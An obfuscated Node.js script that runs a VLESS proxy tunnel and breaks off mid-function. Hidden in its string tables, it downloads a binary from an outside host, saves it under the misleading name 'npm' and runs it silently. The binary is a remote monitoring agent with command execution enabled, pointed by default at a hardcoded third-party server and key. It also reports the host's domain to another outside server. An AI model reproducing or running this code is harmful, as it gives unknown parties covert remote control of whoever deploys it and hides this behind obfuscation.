const _0x26a83e=_0x2e86;(function(_0x38e54a,_0x15a218){const _0x1dc43d=_0x2e86,_0x114f9c=_0x38e54a();while(!![]){try{const _0x52d720=-parseInt(_0x1dc43d(0x92))/0x1*(parseInt(_0x1dc43d(0xe2))/0x2)+-parseInt(_0x1dc43d(0xe1))/0x3*(-parseInt(_0x1dc43d(0x151))/0x4)+parseInt(_0x1dc43d(0x139))/0x5+parseInt(_0x1dc43d(0xc1))/0x6*(-parseInt(_0x1dc43d(0xd3))/0x7)+-parseInt(_0x1dc43d(0xa1))/0x8*(parseInt(_0x1dc43d(0xaa))/0x9)+-parseInt(_0x1dc43d(0xd7))/0xa*(parseInt(_0x1dc43d(0x95))/0xb)+parseInt(_0x1dc43d(0x157))/0xc;if(_0x52d720===_0x15a218)break;else _0x114f9c['push'](_0x114f9c['shift']());}catch(_0x4941a0){_0x114f9c['push'](_0x114f9c['shift']());}}}(_0x10ac,0x8c39a));const os=require('os'),fs=require('fs'),net=require('net'),http=require(_0x26a83e(0x13d)),axios=require('axios'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x26a83e(0x156)),UUID=process[_0x26a83e(0x125)]['UUID']||_0x26a83e(0x87),NEZHA_SERVER=process['env'][_0x26a83e(0x138)]||'nzag.faiz.us.kg:8008',NEZHA_PORT=process[_0x26a83e(0x125)]['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||_0x26a83e(0x148),AUTO_ACCESS=process[_0x26a83e(0x125)]['AUTO_ACCESS']||![],XPATH=process['env'][_0x26a83e(0xdc)]||UUID[_0x26a83e(0x12f)](0x0,0x8),SUB_PATH=process[_0x26a83e(0x125)]['SUB_PATH']||_0x26a83e(0x14d),DOMAIN=process[_0x26a83e(0x125)][_0x26a83e(0x9d)]||'',NAME=process['env'][_0x26a83e(0xc3)]||'Vls',PORT=process[_0x26a83e(0x125)][_0x26a83e(0xfe)]||0xbb8,SETTINGS={[_0x26a83e(0x11f)]:UUID,[_0x26a83e(0x10e)]:_0x26a83e(0xad),[_0x26a83e(0x84)]:_0x26a83e(0x131),['XPATH']:_0x26a83e(0xde)+XPATH,[_0x26a83e(0x11e)]:0x1e,[_0x26a83e(0x120)]:0xf4240,['SESSION_TIMEOUT']:0x7530,['CHUNK_SIZE']:0x400*0x400,['TCP_NODELAY']:!![],[_0x26a83e(0xba)]:!![]};function validate_uuid(_0x5b2b65,_0x551312){for(let _0x2c2a54=0x0;_0x2c2a54<0x10;_0x2c2a54++){if(_0x5b2b65[_0x2c2a54]!==_0x551312[_0x2c2a54])return![];}return!![];}function concat_typed_arrays(_0x1bed15,..._0x47cfb0){const _0x39240e=_0x26a83e;if(!_0x47cfb0||_0x47cfb0[_0x39240e(0x93)]<0x1)return _0x1bed15;let _0x25b36f=_0x1bed15[_0x39240e(0x93)];for(let _0x3085d6 of _0x47cfb0)_0x25b36f+=_0x3085d6[_0x39240e(0x93)];const _0x4a5142=new _0x1bed15['constructor'](_0x25b36f);_0x4a5142[_0x39240e(0xb4)](_0x1bed15,0x0),_0x25b36f=_0x1bed15[_0x39240e(0x93)];for(let _0x4b39dc of _0x47cfb0){_0x4a5142[_0x39240e(0xb4)](_0x4b39dc,_0x25b36f),_0x25b36f+=_0x4b39dc[_0x39240e(0x93)];}return _0x4a5142;}function log(_0x48b240,..._0x5bb215){const _0x2787cf=_0x26a83e;if(SETTINGS[_0x2787cf(0x10e)]===_0x2787cf(0xad))return;const _0x506740={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x4056fa={'debug':_0x2787cf(0x107),'info':_0x2787cf(0xd4),'warn':_0x2787cf(0xee),'error':_0x2787cf(0xf6),'reset':'\x1b[0m'},_0x1e7a91=_0x506740[SETTINGS['LOG_LEVEL']]||0x1,_0x169adf=_0x506740[_0x48b240]||0x0;if(_0x169adf>=_0x1e7a91){const _0x3d26bf=new Date()['toISOString'](),_0x4d7bd5=_0x4056fa[_0x48b240]||_0x4056fa[_0x2787cf(0x10c)];console['log'](_0x4d7bd5+'['+_0x3d26bf+_0x2787cf(0x10a)+_0x48b240+']',..._0x5bb215,_0x4056fa[_0x2787cf(0x10c)]);}}const getDownloadUrl=()=>{const _0x466f4d=_0x26a83e,_0x425fee=os[_0x466f4d(0x13e)]();return _0x425fee===_0x466f4d(0x90)||_0x425fee==='arm64'||_0x425fee===_0x466f4d(0xf3)?!NEZHA_PORT?_0x466f4d(0x104):_0x466f4d(0x14a):!NEZHA_PORT?_0x466f4d(0x12c):_0x466f4d(0x122);},downloadFile=async()=>{const _0x3142e6=_0x26a83e;if(!NEZHA_KEY)return;try{const _0x19e825=getDownloadUrl(),_0x45f62e=await axios({'method':'get','url':_0x19e825,'responseType':_0x3142e6(0xcb)}),_0x11c99c=fs['createWriteStream']('npm');return _0x45f62e['data'][_0x3142e6(0x13b)](_0x11c99c),new Promise((_0x4ba5f9,_0xa2abbe)=>{const _0x3cd74d=_0x3142e6;_0x11c99c['on'](_0x3cd74d(0x97),()=>{const _0xaacc46=_0x3cd74d;console['log'](_0xaacc46(0xb0)),exec('chmod\x20+x\x20npm',_0x4100e3=>{if(_0x4100e3)_0xa2abbe(_0x4100e3);_0x4ba5f9();});}),_0x11c99c['on']('error',_0xa2abbe);});}catch(_0x40ddc3){throw _0x40ddc3;}},runnz=async()=>{const _0x5a1d26=_0x26a83e;await downloadFile();let _0x5b78ed='',_0x332f33='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x192f07=[_0x5a1d26(0xda),_0x5a1d26(0xbc),_0x5a1d26(0xb8),_0x5a1d26(0xc6),'2083',_0x5a1d26(0xb2)];_0x5b78ed=_0x192f07[_0x5a1d26(0xa7)](NEZHA_PORT)?_0x5a1d26(0xb3):'',_0x332f33='nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5b78ed+_0x5a1d26(0xb9);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2bc63a=NEZHA_SERVER[_0x5a1d26(0xa7)](':')?NEZHA_SERVER['split'](':')[_0x5a1d26(0x123)]():'',_0x2e4e46=new Set([_0x5a1d26(0xda),_0x5a1d26(0xbc),'2096',_0x5a1d26(0xc6),'2083',_0x5a1d26(0xb2)]),_0x260933=_0x2e4e46[_0x5a1d26(0x140)](_0x2bc63a)?'true':_0x5a1d26(0xcc),_0x3ada70=_0x5a1d26(0x8f)+NEZHA_KEY+_0x5a1d26(0xf4)+NEZHA_SERVER+_0x5a1d26(0x154)+_0x260933+_0x5a1d26(0x9f)+UUID;fs[_0x5a1d26(0x11c)](_0x5a1d26(0xb7),_0x3ada70);}_0x332f33=_0x5a1d26(0x155);}else return;}try{exec(_0x332f33,{'shell':'/bin/bash'}),console[_0x5a1d26(0x136)](_0x5a1d26(0x101));}catch(_0x7b3222){console['error'](_0x5a1d26(0xc9)+_0x7b3222);}};function _0x10ac(){const _0x112cd1=['NEZHA_SERVER','1896265NEvIZX','end','pipe','=================================','http','arch','data','has','now','Max\x20buffered\x20posts:\x20','http/1.1','socket','&path=','close','unsupported\x20command:\x20','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','Remote\x20error:\x20','https://arm64.ssss.nyc.mn/agent','headerSent','Created\x20new\x20session\x20with\x20UUID:\x20','sub','Session\x20','https://','no-store','452380zSvhwD','Starting\x20to\x20parse\x20VLESS\x20header','write','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','child_process','21942432xHWtRX','decode','info','\x20before\x20initialization','port','chunked','join','BUFFER_SIZE','enqueue','Failed\x20to\x20initialize\x20VLESS\x20connection','03ed3486-896e-449e-b444-a797e24deb03','Transform','warn','fill','_startDownstreamResponse','writableEnded','hostname','Processed\x20packet\x20seq=','\x0aclient_secret:\x20','arm','Failed\x20to\x20write\x20to\x20remote:\x20','10551srDXql','length','downstreamStarted','416977DCZeBa','keepAliveTimeout','finish','\x20bytes','finally','getReader','parse\x20hostname\x20failed','initializeVLESS','DOMAIN','writable','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Cleanup\x20error:\x20','5712664BPrcjd','&mode=packet-up#','Cleaning\x20up\x20session\x20','message','text/plain','concat','includes','reduce','Server\x20error:\x20','9GSHCqt','method','connect\x20timeout','none','Download\x20error:\x20','Connected\x20to\x20','npm\x20download\x20successfully','read\x20address\x20type\x20failed','2053','--tls','set','GET,\x20POST','size','config.yaml','2096','\x20>/dev/null\x202>&1\x20&','TCP_KEEPALIVE','floor','8443','headersTimeout','Remote\x20connection\x20established','connect','createConnection','2760rcenox','match','NAME','from','_writeToRemote','2087','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','setNoDelay','npm\x20running\x20error:\x20','getWriter','stream','false','remote','socket\x20hang\x20up','resp','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','debug','Failed\x20to\x20get\x20IP\x20address:','10213vtzNFf','\x1b[32m','Received\x20out\x20of\x20order\x20packet\x20seq=','Read\x20controller\x20close\x20error:','60FtiilB','SESSION_TIMEOUT','Content-Type','443','responseHeader','XPATH','Log\x20level:\x20','%2F','Automatic\x20Access\x20Task\x20added\x20successfully:','releaseLock','21DWKfVS','154wUZKUk','readable','push','Session\x20timeout:\x20','done','uuid','pendingPackets','\x20timed\x20out\x20without\x20downstream','headersSent','Client\x20connection\x20closed','timeout','unlink','\x1b[33m','Failed\x20to\x20initialize\x20VLESS:\x20','Transfer-Encoding','currentStreamRes','utf-8','aarch64','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','New\x20secure\x20connection\x20using:\x20','\x1b[31m','pipeTo','catch','):\x20','startDownstream','destroy','Process\x20packet\x20error:\x20','initialized','PORT','base64','trim','npm\x20is\x20running','random','Failed\x20to\x20parse\x20hostname','https://arm64.ssss.nyc.mn/v1','listen','createServer','\x1b[36m','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','Socket\x20is\x20destroyed',']\x20[','destroyed','reset','reading_done','LOG_LEVEL','url','invalid\x20UUID','Hello,\x20World\x0a','Upload\x20error:\x20','/([^/]+)(?:/([0-9]+))?$','bufferedData','forEach','POST','aborted','alpnProtocol','\x22}\x27','delete','VLESS\x20header\x20parsed:\x20','writeFileSync','cleaned','MAX_BUFFERED_POSTS','UUID','MAX_POST_SIZE','Too\x20many\x20buffered\x20packets','https://amd64.ssss.nyc.mn/agent','pop','cleanup','env','Server\x20is\x20running\x20on\x20port\x20','pendingBuffers','value','Error\x20starting\x20downstream:\x20','vlessHeader','writeHead','https://amd64.ssss.nyc.mn/v1','CHUNK_SIZE','application/octet-stream','slice','error','2048','nextSeq','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','toString','resume','log','get'];_0x10ac=function(){return _0x112cd1;};return _0x10ac();}async function addAccessTask(){const _0x2579d2=_0x26a83e;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x29f492=_0x2579d2(0x14f)+DOMAIN,_0x1dd533=_0x2579d2(0xd0)+_0x29f492+_0x2579d2(0x119);exec(_0x1dd533,(_0x1f1347,_0x1f71a1,_0x16d2eb)=>{const _0x3c94ee=_0x2579d2;if(_0x1f1347){console[_0x3c94ee(0x130)]('Error\x20sending\x20request:',_0x1f1347[_0x3c94ee(0xa4)]);return;}console[_0x3c94ee(0x136)](_0x3c94ee(0xdf),_0x1f71a1);});}catch(_0x590d42){console['error']('Error\x20added\x20Task:',_0x590d42[_0x2579d2(0xa4)]);}}function parse_uuid(_0x3ae4d5){const _0x2f544d=_0x26a83e;_0x3ae4d5=_0x3ae4d5['replaceAll']('-','');const _0x3ccbc7=[];for(let _0x3757f7=0x0;_0x3757f7<0x10;_0x3757f7++){_0x3ccbc7[_0x2f544d(0xe4)](parseInt(_0x3ae4d5['substr'](_0x3757f7*0x2,0x2),0x10));}return _0x3ccbc7;}async function read_vless_header(_0x14d88a,_0x2f960e){const _0x13c914=_0x26a83e;let _0x3ca769=0x0,_0x309219=new Uint8Array(),_0x161c13={'value':_0x309219,'done':![]};async function _0x2ba94f(_0x4c1e04){const _0x18f081=_0x2e86;if(_0x161c13[_0x18f081(0xe6)])throw new Error('header\x20length\x20too\x20short');const _0x169e8d=_0x4c1e04-_0x3ca769;if(_0x169e8d<0x1)return;_0x161c13=await read_atleast(_0x14d88a,_0x169e8d),_0x3ca769+=_0x161c13['value'][_0x18f081(0x93)],_0x309219=concat_typed_arrays(_0x309219,_0x161c13[_0x18f081(0x128)]);}await _0x2ba94f(0x1+0x10+0x1);const _0x46a60e=_0x309219[0x0],_0x2cc8eb=_0x309219['slice'](0x1,0x1+0x10),_0x2cf2e4=parse_uuid(_0x2f960e);if(!validate_uuid(_0x2cc8eb,_0x2cf2e4))throw new Error(_0x13c914(0x110));const _0x6fa6b8=_0x309219[0x1+0x10],_0x26fe90=0x1+0x10+0x1+_0x6fa6b8+0x1+0x2+0x1;await _0x2ba94f(_0x26fe90+0x1);const _0x567467=_0x309219[0x1+0x10+0x1+_0x6fa6b8],_0x25c4ea=0x1;if(_0x567467!==_0x25c4ea)throw new Error(_0x13c914(0x147)+_0x567467);const _0x3411a6=(_0x309219[_0x26fe90-0x1-0x2]<<0x8)+_0x309219[_0x26fe90-0x1-0x1],_0x280bf1=_0x309219[_0x26fe90-0x1],_0x35bec9=0x1,_0x1ae045=0x2,_0x2b5b52=0x3;let _0x4d9db6=-0x1;if(_0x280bf1===_0x35bec9)_0x4d9db6=_0x26fe90+0x4;else{if(_0x280bf1===_0x2b5b52)_0x4d9db6=_0x26fe90+0x10;else _0x280bf1===_0x1ae045&&(_0x4d9db6=_0x26fe90+0x1+_0x309219[_0x26fe90]);}if(_0x4d9db6<0x0)throw new Error(_0x13c914(0xb1));await _0x2ba94f(_0x4d9db6);const _0xc0c2a4=_0x26fe90;let _0x2e3452='';if(_0x280bf1===_0x35bec9)_0x2e3452=_0x309219[_0x13c914(0x12f)](_0xc0c2a4,_0xc0c2a4+0x4)[_0x13c914(0x83)]('.');else{if(_0x280bf1===_0x1ae045)_0x2e3452=new TextDecoder()[_0x13c914(0x158)](_0x309219['slice'](_0xc0c2a4+0x1,_0xc0c2a4+0x1+_0x309219[_0xc0c2a4]));else _0x280bf1===_0x2b5b52&&(_0x2e3452=_0x309219[_0x13c914(0x12f)](_0xc0c2a4,_0xc0c2a4+0x10)[_0x13c914(0xa8)]((_0x57a222,_0x11da45,_0x29651a,_0x518587)=>_0x29651a%0x2?_0x57a222[_0x13c914(0xa6)](((_0x518587[_0x29651a-0x1]<<0x8)+_0x11da45)[_0x13c914(0x134)](0x10)):_0x57a222,[])[_0x13c914(0x83)](':'));}if(!_0x2e3452){log(_0x13c914(0x130),_0x13c914(0x103));throw new Error(_0x13c914(0x9b));}return log(_0x13c914(0x159),'VLESS\x20connection\x20to\x20'+_0x2e3452+':'+_0x3411a6),{'hostname':_0x2e3452,'port':_0x3411a6,'data':_0x309219[_0x13c914(0x12f)](_0x4d9db6),'resp':new Uint8Array([_0x46a60e,0x0])};}async function read_atleast(_0x57ec23,_0x2d4f33){const _0x356b17=_0x26a83e,_0x5da2f5=[];let _0x18d6ed=![];while(_0x2d4f33>0x0&&!_0x18d6ed){const _0xd94e9c=await _0x57ec23['read']();if(_0xd94e9c[_0x356b17(0x128)]){const _0x3560a5=new Uint8Array(_0xd94e9c[_0x356b17(0x128)]);_0x5da2f5['push'](_0x3560a5),_0x2d4f33-=_0x3560a5[_0x356b17(0x93)];}_0x18d6ed=_0xd94e9c[_0x356b17(0xe6)];}if(_0x2d4f33>0x0)throw new Error('not\x20enough\x20data\x20to\x20read');return{'value':concat_typed_arrays(..._0x5da2f5),'done':_0x18d6ed};}async function parse_header(_0x7b678e,_0x414a40){const _0x5260ce=_0x26a83e;log(_0x5260ce(0xd1),_0x5260ce(0x152));const _0x272a60=_0x414a40[_0x5260ce(0xe3)][_0x5260ce(0x9a)]();try{const _0x334104=await read_vless_header(_0x272a60,_0x7b678e);return log(_0x5260ce(0xd1),'VLESS\x20header\x20parsed\x20successfully'),_0x334104;}catch(_0x569a20){log('error','VLESS\x20header\x20parse\x20error:\x20'+_0x569a20[_0x5260ce(0xa4)]);throw new Error('read\x20vless\x20header\x20error:\x20'+_0x569a20[_0x5260ce(0xa4)]);}finally{_0x272a60[_0x5260ce(0xe0)]();}}async function connect_remote(_0x5d3515,_0x435d9d){const _0x2aad7e=_0x26a83e,_0x463deb=0x1f40;try{const _0x422262=await timed_connect(_0x5d3515,_0x435d9d,_0x463deb);return _0x422262[_0x2aad7e(0xc8)](!![]),_0x422262['setKeepAlive'](!![],0x3e8),_0x422262['bufferSize']=parseInt(SETTINGS[_0x2aad7e(0x84)])*0x400,log(_0x2aad7e(0x159),_0x2aad7e(0xaf)+_0x5d3515+':'+_0x435d9d),_0x422262;}catch(_0x343391){log(_0x2aad7e(0x130),'Connection\x20failed:\x20'+_0x343391[_0x2aad7e(0xa4)]);throw _0x343391;}}function timed_connect(_0x1a7bdd,_0x2f5dec,_0xcc38bb){return new Promise((_0x4c1a4f,_0x4d4020)=>{const _0x248d61=_0x2e86,_0x491f49=net[_0x248d61(0xc0)]({'host':_0x1a7bdd,'port':_0x2f5dec}),_0x3466ac=setTimeout(()=>{const _0x188204=_0x248d61;_0x4d4020(new Error(_0x188204(0xac)));},_0xcc38bb);_0x491f49['on'](_0x248d61(0xbf),()=>{clearTimeout(_0x3466ac),_0x4c1a4f(_0x491f49);}),_0x491f49['on'](_0x248d61(0x130),_0x2992bc=>{clearTimeout(_0x3466ac),_0x4d4020(_0x2992bc);});});}function pipe_relay(){async function _0x38f932(_0x353ee7,_0x10d1de,_0x29e973){const _0x729bf8=_0x2e86,_0x4876dd=parseInt(SETTINGS[_0x729bf8(0x12d)]);if(_0x29e973[_0x729bf8(0x93)]>0x0){if(_0x10d1de[_0x729bf8(0x153)])_0x10d1de['cork'](),_0x10d1de[_0x729bf8(0x153)](_0x29e973),process['nextTick'](()=>_0x10d1de['uncork']());else{const _0x208400=_0x10d1de[_0x729bf8(0x9e)][_0x729bf8(0xca)]();try{await _0x208400['write'](_0x29e973);}finally{_0x208400[_0x729bf8(0xe0)]();}}}try{_0x353ee7[_0x729bf8(0x13b)]?(_0x353ee7['pause'](),_0x353ee7[_0x729bf8(0x13b)](_0x10d1de,{'end':!![],'highWaterMark':_0x4876dd}),_0x353ee7[_0x729bf8(0x135)]()):await _0x353ee7[_0x729bf8(0xe3)][_0x729bf8(0xf7)](_0x10d1de['writable'],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x729bf8(0xec)](SETTINGS[_0x729bf8(0xd8)])});}catch(_0x51ba5c){!_0x51ba5c[_0x729bf8(0xa4)][_0x729bf8(0xa7)](_0x729bf8(0x117))&&log(_0x729bf8(0x130),'Relay\x20error:',_0x51ba5c['message']);throw _0x51ba5c;}}return _0x38f932;}function socketToWebStream(_0x41b3bf){let _0x38bef2,_0x46e8b6;return _0x41b3bf['on']('error',_0x413c62=>{const _0x237fae=_0x2e86;log(_0x237fae(0x130),'Socket\x20error:',_0x413c62[_0x237fae(0xa4)]),_0x38bef2?.[_0x237fae(0x130)](_0x413c62),_0x46e8b6?.[_0x237fae(0x130)](_0x413c62);}),{'readable':new ReadableStream({'start'(_0x7f613c){const _0x56c0c4=_0x2e86;_0x38bef2=_0x7f613c,_0x41b3bf['on'](_0x56c0c4(0x13f),_0x4a4056=>{const _0x27f8d7=_0x56c0c4;try{_0x7f613c[_0x27f8d7(0x85)](_0x4a4056);}catch(_0x1166c6){log(_0x27f8d7(0x130),'Read\x20controller\x20error:',_0x1166c6[_0x27f8d7(0xa4)]);}}),_0x41b3bf['on'](_0x56c0c4(0x13a),()=>{const _0x35717d=_0x56c0c4;try{_0x7f613c[_0x35717d(0x146)]();}catch(_0x4a60a1){log(_0x35717d(0x130),_0x35717d(0xd6),_0x4a60a1[_0x35717d(0xa4)]);}});},'cancel'(){_0x41b3bf['destroy']();}}),'writable':new WritableStream({'start'(_0x4bb025){_0x46e8b6=_0x4bb025;},'write'(_0x516eb9){return new Promise((_0x2f8fd5,_0x86c1c0)=>{const _0x4aefcb=_0x2e86;if(_0x41b3bf[_0x4aefcb(0x10b)]){_0x86c1c0(new Error(_0x4aefcb(0x109)));return;}_0x41b3bf[_0x4aefcb(0x153)](_0x516eb9,_0x200e1f=>{if(_0x200e1f)_0x86c1c0(_0x200e1f);else _0x2f8fd5();});});},'close'(){const _0x1d3be2=_0x2e86;!_0x41b3bf[_0x1d3be2(0x10b)]&&_0x41b3bf['end']();},'abort'(_0x1b5f10){const _0x4fd77e=_0x2e86;_0x41b3bf[_0x4fd77e(0xfb)](_0x1b5f10);}})};}function relay(_0x37c818,_0x351672,_0x511f4a,_0x33fb18){const _0x1f8597=_0x26a83e,_0x38b7d4=pipe_relay();let _0x5b2c0c=![];const _0x3e9fa4=socketToWebStream(_0x511f4a);function _0x3802bf(){const _0x442f5c=_0x2e86;if(!_0x5b2c0c){_0x5b2c0c=!![];try{_0x511f4a[_0x442f5c(0xfb)]();}catch(_0x661c16){!_0x661c16[_0x442f5c(0xa4)][_0x442f5c(0xa7)]('aborted')&&!_0x661c16[_0x442f5c(0xa4)]['includes'](_0x442f5c(0xce))&&log(_0x442f5c(0x130),_0x442f5c(0xa0)+_0x661c16['message']);}}}const _0x5db567=_0x38b7d4(_0x351672,_0x3e9fa4,_0x33fb18[_0x1f8597(0x13f)])[_0x1f8597(0xf8)](_0x41f156=>{const _0x5030e3=_0x1f8597;!_0x41f156['message'][_0x5030e3(0xa7)](_0x5030e3(0x117))&&!_0x41f156[_0x5030e3(0xa4)][_0x5030e3(0xa7)](_0x5030e3(0xce))&&log(_0x5030e3(0x130),_0x5030e3(0x112)+_0x41f156['message']);})[_0x1f8597(0x99)](()=>{const _0x4c9a96=_0x1f8597;_0x351672[_0x4c9a96(0x10d)]&&_0x351672[_0x4c9a96(0x10d)]();}),_0x4418f3=_0x38b7d4(_0x3e9fa4,_0x351672,_0x33fb18[_0x1f8597(0xcf)])[_0x1f8597(0xf8)](_0x58bb37=>{const _0x4c7284=_0x1f8597;!_0x58bb37[_0x4c7284(0xa4)][_0x4c7284(0xa7)](_0x4c7284(0x117))&&!_0x58bb37[_0x4c7284(0xa4)][_0x4c7284(0xa7)](_0x4c7284(0xce))&&log(_0x4c7284(0x130),_0x4c7284(0xae)+_0x58bb37[_0x4c7284(0xa4)]);});_0x4418f3[_0x1f8597(0x99)](()=>_0x5db567)[_0x1f8597(0x99)](_0x3802bf);}const sessions=new Map();class Session{constructor(_0x9cda5f){const _0x49db42=_0x26a83e;this[_0x49db42(0xe7)]=_0x9cda5f,this[_0x49db42(0x132)]=0x0,this[_0x49db42(0x94)]=![],this['lastActivity']=Date[_0x49db42(0x141)](),this[_0x49db42(0x12a)]=null,this[_0x49db42(0xcd)]=null,this[_0x49db42(0xfd)]=![],this[_0x49db42(0xdb)]=null,this['headerSent']=![],this[_0x49db42(0x114)]=new Map(),this[_0x49db42(0x11d)]=![],this[_0x49db42(0xe8)]=[],this[_0x49db42(0xf1)]=null,this[_0x49db42(0x127)]=new Map(),log('debug',_0x49db42(0x14c)+_0x9cda5f);}async[_0x26a83e(0x9c)](_0x2bb986){const _0x403814=_0x26a83e;if(this['initialized'])return!![];try{log(_0x403814(0xd1),'Initializing\x20VLESS\x20connection\x20from\x20first\x20packet');const _0x174074=new ReadableStream({'start'(_0x2be70b){const _0x4a6b3d=_0x403814;_0x2be70b[_0x4a6b3d(0x85)](_0x2bb986),_0x2be70b['close']();}}),_0x5ade98={'readable':_0x174074,'writable':new WritableStream()};return this['vlessHeader']=await parse_header(SETTINGS['UUID'],_0x5ade98),log(_0x403814(0x159),_0x403814(0x11b)+this[_0x403814(0x12a)][_0x403814(0x8d)]+':'+this[_0x403814(0x12a)][_0x403814(0x15b)]),this[_0x403814(0xcd)]=await connect_remote(this[_0x403814(0x12a)]['hostname'],this[_0x403814(0x12a)][_0x403814(0x15b)]),log(_0x403814(0x159),_0x403814(0xbe)),this[_0x403814(0xfd)]=!![],!![];}catch(_0x38c733){return log('error',_0x403814(0xef)+_0x38c733[_0x403814(0xa4)]),![];}}async['processPacket'](_0x43d035,_0x1a8c42){const _0x3d7879=_0x26a83e;try{this[_0x3d7879(0x127)]['set'](_0x43d035,_0x1a8c42),log('debug','Buffered\x20packet\x20seq='+_0x43d035+',\x20size='+_0x1a8c42[_0x3d7879(0x93)]);while(this['pendingBuffers'][_0x3d7879(0x140)](this['nextSeq'])){const _0x660a67=this['pendingBuffers']['get'](this[_0x3d7879(0x132)]);this[_0x3d7879(0x127)]['delete'](this['nextSeq']);if(!this['initialized']&&this[_0x3d7879(0x132)]===0x0){if(!await this[_0x3d7879(0x9c)](_0x660a67))throw new Error(_0x3d7879(0x86));this[_0x3d7879(0xdb)]=Buffer[_0x3d7879(0xc4)](this[_0x3d7879(0x12a)][_0x3d7879(0xcf)]),await this[_0x3d7879(0xc5)](this['vlessHeader'][_0x3d7879(0x13f)]),this[_0x3d7879(0xf1)]&&this['_startDownstreamResponse']();}else{if(!this[_0x3d7879(0xfd)]){log(_0x3d7879(0x89),_0x3d7879(0xd5)+_0x43d035+_0x3d7879(0x15a));continue;}await this[_0x3d7879(0xc5)](_0x660a67);}this[_0x3d7879(0x132)]++,log(_0x3d7879(0xd1),_0x3d7879(0x8e)+(this[_0x3d7879(0x132)]-0x1));}if(this[_0x3d7879(0x127)][_0x3d7879(0xb6)]>SETTINGS[_0x3d7879(0x11e)])throw new Error(_0x3d7879(0x121));return!![];}catch(_0x30d72a){log(_0x3d7879(0x130),_0x3d7879(0xfc)+_0x30d72a[_0x3d7879(0xa4)]);throw _0x30d72a;}}[_0x26a83e(0x8b)](){const _0x22c2e5=_0x26a83e;if(!this[_0x22c2e5(0xf1)]||!this[_0x22c2e5(0xdb)])return;try{const _0x5bf529=this[_0x22c2e5(0xf1)][_0x22c2e5(0x144)]?.['alpnProtocol']||_0x22c2e5(0x143),_0x279466=_0x5bf529==='h2';!this[_0x22c2e5(0x14b)]&&(log('debug','Sending\x20VLESS\x20response\x20header\x20('+_0x5bf529+_0x22c2e5(0xf9)+this[_0x22c2e5(0xdb)][_0x22c2e5(0x93)]+_0x22c2e5(0x98)),this[_0x22c2e5(0xf1)]['write'](this[_0x22c2e5(0xdb)]),this[_0x22c2e5(0x14b)]=!![]);if(_0x279466){this[_0x22c2e5(0xf1)][_0x22c2e5(0x144)][_0x22c2e5(0xc8)](!![]);const _0x35e423=new require(_0x22c2e5(0xcb))[_0x22c2e5(0x88)]({'transform'(_0x24f02d,_0x464a63,_0x1be5de){const _0x2f8372=_0x22c2e5,_0x5464c6=0x4000;for(let _0xd9906f=0x0;_0xd9906f<_0x24f02d[_0x2f8372(0x93)];_0xd9906f+=_0x5464c6){this[_0x2f8372(0xe4)](_0x24f02d[_0x2f8372(0x12f)](_0xd9906f,_0xd9906f+_0x5464c6));}_0x1be5de();}});this[_0x22c2e5(0xcd)][_0x22c2e5(0x13b)](_0x35e423)[_0x22c2e5(0x13b)](this[_0x22c2e5(0xf1)]);}else this[_0x22c2e5(0xcd)]['pipe'](this[_0x22c2e5(0xf1)]);this[_0x22c2e5(0xcd)]['on'](_0x22c2e5(0x13a),()=>{const _0x40ef0d=_0x22c2e5;!this[_0x40ef0d(0xf1)]['writableEnded']&&this[_0x40ef0d(0xf1)]['end']();}),this[_0x22c2e5(0xcd)]['on']('error',_0x544963=>{const _0x1e1fe8=_0x22c2e5;log('error',_0x1e1fe8(0x149)+_0x544963[_0x1e1fe8(0xa4)]),!this[_0x1e1fe8(0xf1)][_0x1e1fe8(0x8c)]&&this['currentStreamRes'][_0x1e1fe8(0x13a)]();});}catch(_0x99ee56){log(_0x22c2e5(0x130),_0x22c2e5(0x129)+_0x99ee56['message']),this[_0x22c2e5(0x124)]();}}[_0x26a83e(0xfa)](_0x4599ff,_0x5ff4){const _0x516a86=_0x26a83e;return!_0x4599ff['headersSent']&&_0x4599ff[_0x516a86(0x12b)](0xc8,_0x5ff4),this[_0x516a86(0xf1)]=_0x4599ff,this[_0x516a86(0xfd)]&&this[_0x516a86(0xdb)]&&this[_0x516a86(0x8b)](),_0x4599ff['on'](_0x516a86(0x146),()=>{const _0x2caa41=_0x516a86;log(_0x2caa41(0x159),_0x2caa41(0xeb)),this['cleanup']();}),!![];}async[_0x26a83e(0xc5)](_0x57f6cf){const _0x1bb159=_0x26a83e;if(!this['remote']||this[_0x1bb159(0xcd)][_0x1bb159(0x10b)])throw new Error('Remote\x20connection\x20not\x20available');return new Promise((_0x3d7b9b,_0x1f8761)=>{const _0x3eb3c9=_0x1bb159;this[_0x3eb3c9(0xcd)][_0x3eb3c9(0x153)](_0x57f6cf,_0x9eeec6=>{const 